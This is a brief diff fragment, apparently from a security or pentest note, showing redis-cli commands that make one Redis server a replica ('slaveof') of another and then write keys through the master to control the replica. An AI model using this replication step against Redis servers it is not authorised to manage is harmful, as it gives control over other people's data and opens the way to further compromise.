+A master-slave connection will be established from the slave redis and the master redis:
+redis-cli -h 10.85.0.52 -p 6379
+slaveof 10.85.0.51 6379
+Then you can login to the master redis to control the slave redis:
+redis-cli -h 10.85.0.51 -p 6379
+set mykey hello
+set mykey2 helloworld
